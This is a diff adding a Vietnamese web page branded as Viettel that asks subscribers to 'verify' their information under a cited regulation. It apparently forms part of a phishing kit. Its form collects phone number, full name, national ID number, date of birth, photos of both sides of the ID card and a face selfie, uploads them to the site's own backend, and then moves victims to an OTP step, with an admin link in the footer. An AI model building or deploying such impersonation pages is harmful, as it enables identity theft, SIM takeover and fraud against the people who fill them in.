@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Viettel - Xác thực thông tin thuê bao</title>
+    <link rel="stylesheet" href="/style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="logo">
+    <img src="/logo.png" alt="Viettel" class="logo-img">
+    <p>Xác thực thông tin thuê bao</p>
+</div>
+
+            <div class="badge">
+                📰 Theo Thông tư 08/2026/TT-BKHCN
+            </div>
+
+            <form id="verifyForm" enctype="multipart/form-data">
+                <div class="form-group">
+                    <label>📱 Số điện thoại *</label>
+                    <input type="tel" id="phone" placeholder="0988888888" maxlength="10" autocomplete="off">
+                    <div id="phoneStatus" class="phone-status"></div>
+                    <small>Chỉ chấp nhận đầu số Viettel</small>
+                </div>
+
+                <div class="form-group">
+                    <label>👤 Họ và tên (theo CCCD) *</label>
+                    <input type="text" id="fullname" placeholder="Nguyễn Văn A">
+                </div>
+
+                <div class="form-group">
+                    <label>🆔 Số CCCD/Căn cước *</label>
+                    <input type="text" id="identity_number" placeholder="012345678912" maxlength="12">
+                </div>
+
+                <div class="form-group">
+                    <label>📅 Ngày sinh *</label>
+                    <input type="date" id="dob">
+                </div>
+
+                <div class="form-group">
+                    <label>📷 Ảnh mặt trước CCCD *</label>
+                    <div class="upload-area" id="uploadFront">
+                        <div class="upload-icon">📤</div>
+                        <p>Nhấn để tải ảnh lên</p>
+                        <small>JPEG, PNG (tối đa 5MB)</small>
+                        <button type="button" class="remove-btn" onclick="removeImage('cccd_front', 'previewFront', 'uploadFront')">✕</button>
+                        <img id="previewFront" class="preview-img" style="display:none;">
+                    </div>
+                    <input type="file" id="cccd_front" accept="image/*" style="display:none;">
+                </div>
+
+                <div class="form-group">
+                    <label>📷 Ảnh mặt sau CCCD *</label>
+                    <div class="upload-area" id="uploadBack">
+                        <div class="upload-icon">📤</div>
+                        <p>Nhấn để tải ảnh lên</p>
+                        <button type="button" class="remove-btn" onclick="removeImage('cccd_back', 'previewBack', 'uploadBack')">✕</button>
+                        <img id="previewBack" class="preview-img" style="display:none;">
+                    </div>
+                    <input type="file" id="cccd_back" accept="image/*" style="display:none;">
+                </div>
+
+                <div class="form-group">
+                    <label>🤳 Ảnh chân dung *</label>
+                    <div class="upload-area" id="uploadFace">
+                        <div class="upload-icon">📸</div>
+                        <p>Nhấn để chụp hoặc tải ảnh</p>
+                        <button type="button" class="remove-btn" onclick="removeImage('face_photo', 'previewFace', 'uploadFace')">✕</button>
+                        <img id="previewFace" class="preview-img" style="display:none;">
+                    </div>
+                    <input type="file" id="face_photo" accept="image/*" style="display:none;">
+                </div>
+
+                <button type="submit" id="submitBtn">🔒 Gửi yêu cầu xác thực</button>
+            </form>
+
+            <div id="message" class="message"></div>
+
+            <hr>
+
+            <div class="footer">
+                <p>🔐 Dữ liệu được bảo mật theo quy định</p>
+                <p>📞 Cần hỗ trợ? Gọi <strong>198</strong> (miễn phí)</p>
+                <a href="/admin.html">👨‍💼 Quản trị</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const VIETTEL_PREFIXES = [
+            '086', '096', '097', '098', '099',
+            '032', '033', '034', '035', '036', '037', '038', '039',
+            '056', '058',
+            '070', '076',
+            '081', '082', '083', '084', '085', '088', '089'
+        ];
+
+        function isViettelPhone(phone) {
+            if (!phone || phone.length !== 10) return false;
+            return VIETTEL_PREFIXES.includes(phone.substring(0, 3));
+        }
+
+        function showMessage(msg, type) {
+            const msgDiv = document.getElementById('message');
+            msgDiv.innerHTML = msg;
+            msgDiv.className = 'message ' + type;
+            msgDiv.style.display = 'block';
+            setTimeout(() => {
+                msgDiv.style.display = 'none';
+            }, 5000);
+        }
+
+        // Kiểm tra số điện thoại realtime
+        document.getElementById('phone').addEventListener('input', function() {
+            const phone = this.value;
+            const statusDiv = document.getElementById('phoneStatus');
+            
+            if (phone.length === 10) {
+                if (isViettelPhone(phone)) {
+                    fetch('/api/check-phone', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ phone: phone })
+                    })
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data.exists) {
+                            if (data.status === 'verified') {
+                                statusDiv.innerHTML = '⚠️ Số này đã xác thực thành công. Không thể đăng ký lại.';
+                                statusDiv.className = 'phone-status invalid';
+                                document.getElementById('phone').classList.add('invalid');
+                                document.getElementById('submitBtn').disabled = true;
+                            } else {
+                                statusDiv.innerHTML = '⏰ Số này đang chờ xác thực. Vui lòng kiểm tra OTP.';
+                                statusDiv.className = 'phone-status invalid';
+                                document.getElementById('phone').classList.add('invalid');
+                                document.getElementById('submitBtn').disabled = true;
+                            }
+                        } else {
+                            statusDiv.innerHTML = '✅ Số Viettel hợp lệ, có thể đăng ký';
+                            statusDiv.className = 'phone-status valid';
+                            document.getElementById('phone').classList.add('valid');
+                            document.getElementById('submitBtn').disabled = false;
+                        }
+                    });
+                } else {
+                    statusDiv.innerHTML = '❌ Số không phải đầu số Viettel';
+                    statusDiv.className = 'phone-status invalid';
+                    document.getElementById('phone').classList.add('invalid');
+                    document.getElementById('submitBtn').disabled = true;
+                }
+            } else if (phone.length > 0 && phone.length < 10) {
+                statusDiv.innerHTML = '⚠️ Cần 10 số (hiện tại ' + phone.length + ' số)';
+                statusDiv.className = 'phone-status invalid';
+                document.getElementById('submitBtn').disabled = true;
+            } else {
+                statusDiv.innerHTML = '';
+                document.getElementById('submitBtn').disabled = false;
+            }
+        });
+
+        // Upload ảnh
+        function setupUpload(inputId, previewId, uploadId) {
+            const input = document.getElementById(inputId);
+            const preview = document.getElementById(previewId);
+            const uploadDiv = document.getElementById(uploadId);
+            
+            input.addEventListener('change', function() {
+                if (this.files && this.files[0]) {
+                    const reader = new FileReader();
+                    reader.onload = function(e) {
+                        preview.src = e.target.result;
+                        preview.style.display = 'block';
+                        uploadDiv.classList.add('has-image');
+                    };
+                    reader.readAsDataURL(this.files[0]);
+                }
+            });
+        }
+
+        function removeImage(inputId, previewId, uploadId) {
+            document.getElementById(inputId).value = '';
+            document.getElementById(previewId).style.display = 'none';
+            document.getElementById(uploadId).classList.remove('has-image');
+        }
+
+        setupUpload('cccd_front', 'previewFront', 'uploadFront');
+        setupUpload('cccd_back', 'previewBack', 'uploadBack');
+        setupUpload('face_photo', 'previewFace', 'uploadFace');
+
+        // Submit form
+        document.getElementById('verifyForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const phone = document.getElementById('phone').value.trim();
+            const fullname = document.getElementById('fullname').value.trim();
+            const identity = document.getElementById('identity_number').value.trim();
+            const dob = document.getElementById('dob').value;
+            const frontFile = document.getElementById('cccd_front').files[0];
+            const backFile = document.getElementById('cccd_back').files[0];
+            const faceFile = document.getElementById('face_photo').files[0];
+            
+            if (!phone) { showMessage('❌ Vui lòng nhập số điện thoại', 'error'); return; }
+            if (!isViettelPhone(phone)) { showMessage('❌ Số ' + phone + ' không phải đầu số Viettel', 'error'); return; }
+            if (!fullname) { showMessage('❌ Vui lòng nhập họ tên', 'error'); return; }
+            if (!identity || identity.length !== 12) { showMessage('❌ Vui lòng nhập đủ 12 số CCCD', 'error'); return; }
+            if (!dob) { showMessage('❌ Vui lòng chọn ngày sinh', 'error'); return; }
+            if (!frontFile) { showMessage('❌ Vui lòng chọn ảnh mặt trước CCCD', 'error'); return; }
+            if (!backFile) { showMessage('❌ Vui lòng chọn ảnh mặt sau CCCD', 'error'); return; }
+            if (!faceFile) { showMessage('❌ Vui lòng chọn ảnh chân dung', 'error'); return; }
+            
+            const formData = new FormData();
+            formData.append('phone', phone);
+            formData.append('fullname', fullname);
+            formData.append('identity_number', identity);
+            formData.append('dob', dob);
+            formData.append('cccd_front', frontFile);
+            formData.append('cccd_back', backFile);
+            formData.append('face_photo', faceFile);
+            
+            const submitBtn = document.getElementById('submitBtn');
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = '⏳ Đang xử lý...';
+            
+            try {
+                const response = await fetch('/api/submit', { method: 'POST', body: formData });
+                const result = await response.json();
+                
+                if (result.success) {
+                    showMessage('✅ ' + result.message, 'success');
+                    sessionStorage.setItem('verify_phone', phone);
+                    if (result.otp) {
+                        showMessage('✅ Mã OTP: ' + result.otp + ' (chế độ test)', 'success');
+                    }
+                    setTimeout(() => { window.location.href = '/verify.html'; }, 2000);
+                } else {
+                    showMessage('❌ ' + result.message, 'error');
+                    submitBtn.disabled = false;
+                    submitBtn.innerHTML = '🔒 Gửi yêu cầu xác thực';
+                }
+            } catch (error) {
+                showMessage('❌ Lỗi kết nối: ' + error.message, 'error');
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = '🔒 Gửi yêu cầu xác thực';
+            }
+        });
+    </script>
+</body>
+</html>
